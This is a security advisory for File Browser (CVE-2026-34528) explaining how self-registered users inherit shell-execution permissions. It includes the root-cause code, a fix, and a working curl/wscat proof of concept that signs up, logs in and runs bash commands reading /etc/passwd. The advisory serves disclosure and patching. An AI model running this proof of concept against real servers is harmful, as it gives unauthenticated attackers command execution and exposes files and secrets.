# [H] File Browser's Signup Grants Execution Permissions When Default Permissions Includes Execution

## Summary
Severity: High
Advisory: GHSA-x8jc-jvqm-pm3f
CVE: CVE-2026-34528
CWE: CWE-269
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-31
Source: https://github.com/advisories/GHSA-x8jc-jvqm-pm3f
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.62.2

## Details
## Summary

The `signupHandler` in File Browser applies default user permissions via `d.settings.Defaults.Apply(user)`, then strips only `Admin` (commit `a63573b`). The `Execute` permission and `Commands` list from the default user template are **not** stripped. When an administrator has enabled signup, server-side execution, and set `Execute=true` in the default user template, any unauthenticated user who self-registers inherits shell execution capabilities and can run arbitrary commands on the server.

## Details

### Root Cause

`signupHandler` at `http/auth.go:167–172` applies all default permissions before stripping only `Admin`:

```go
// http/auth.go
d.settings.Defaults.Apply(user)   // copies ALL permissions from defaults

// Only Admin is stripped — Execute, Commands are still inherited
user.Perm.Admin = false
// user.Perm.Execute remains true if set in defaults
// user.Commands remains populated if set in defaults
```

`settings/defaults.go:31–33` confirms `Apply` copies the full permissions struct including Execute and Commands:

```go
func (d *UserDefaults) Apply(u *users.User) {
    u.Perm = d.Perm          // includes Execute
    u.Commands = d.Commands  // includes allowed shell commands
    // ...
}
```

The `commandsHandler` at `http/commands.go:63–66` checks both the server-wide `EnableExec` flag and `d.user.Perm.Execute`:

```go
if !d.server.EnableExec || !d.user.Perm.Execute {
    // writes "Command not allowed." and returns
}
```

The `withUser` middleware reads `d.user` from the database at request time (`http/auth.go:103`), so the persisted `Execute=true` and `Commands` values from signup are authoritative. The command allowlist check at `commands.go:80` passes because the user's `Commands` list contains the inherited default commands:

```go
if !slices.Contains(d.user.Commands, name) {
    // writes "Command not allowed." and returns
}
```

### Execution Flow

1. Admin configures: `Signup=true`, `EnableExec=true`, `Defaults.Perm.Execute=true`, `Defaults.Commands=["bash"]`
2. Unauthenticated attacker POSTs to `/api/signup` → new user created with `Execute=true`, `Commands=["bash"]`
3. Attacker logs in → receives JWT with valid user ID
4. Attacker opens WebSocket to `/api/command/` → `withUser` fetches user from DB, `Execute=true` passes check
5. Attacker sends `bash` over WebSocket → `exec.Command("bash")` is invoked → arbitrary shell execution

This is a direct consequence of the incomplete fix in commit `a63573b` (CVE-2026-32760 / GHSA-5gg9-5g7w-hm73), which applied the same rationale ("signup users should not inherit privileged defaults") only to `Admin`, not to `Execute` and `Commands`.

## PoC

```bash
TARGET="http://localhost:8080"

# Step 1: Self-register (no authentication required)
curl -s -X POST "$TARGET/api/signup" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"AttackerP@ss1!"}'
# Returns: 200 OK

# Step 2: Log in and capture token
TOKEN=$(curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"AttackerP@ss1!"}' | tr -d '"')

# Step 3: Inspect inherited permissions (decode JWT payload)
echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# Expected output (if defaults have Execute=true, Commands=["bash"]):
# {
#   "user": {
#     "perm": { "execute": true, ... },
#     "commands": ["bash"],
#     ...
#   }
# }

# Step 4: Execute shell command via WebSocket (requires wscat: npm install -g wscat)
echo '{"command":"bash -c \"id && hostname && cat /etc/passwd | head -3\""}' | \
  wscat --header "X-Auth: $TOKEN" \
        --connect "$TARGET/api/command/" \
        --wait 3
# Expected: uid=... hostname output followed by /etc/passwd lines
```

## Impact

On any deployment where an administrator has:
1. Enabled public self-registration (`signup = true`)
2. Enabled server-side command execution (`enableExec = true`)
3. Set `Execute = true` in the default user template
4. Populated `Commands` with one or more shell commands

An unauthenticated attacker can self-register and immediately gain the ability to run arbitrary shell commands on the server with the privileges of the File Browser process. All files accessible to the process, environment variables (including secrets), and network interfaces are exposed. This is a complete server compromise for processes running as root, and a significant lateral movement vector otherwise.

The original `Admin` fix (GHSA-5gg9-5g7w-hm73) demonstrates that the project explicitly recognizes that self-registered users should not inherit privileged defaults. The `Execute` + `Commands` omission is an incomplete application of that principle.

## Recommended Fix

Extend the existing Admin stripping in `http/auth.go` to also clear `Execute` and `Commands` for self-registered users:

```go
// http/auth.go — after d.settings.Defaults.Apply(user)

// Users signed up via the signup handler should never become admins, even
// if that is the default permission.
user.Perm.Admin = false

// Self-registered users should not inherit execution capabilities from
// default settings, regardless of what the administrator has configured
// as the default. Execution rights must be explicitly granted by an admin.
user.Perm.Execute = false
user.Commands = []string{}
```

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-x8jc-jvqm-pm3f
- https://nvd.nist.gov/vuln/detail/CVE-2026-34528
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.62.2
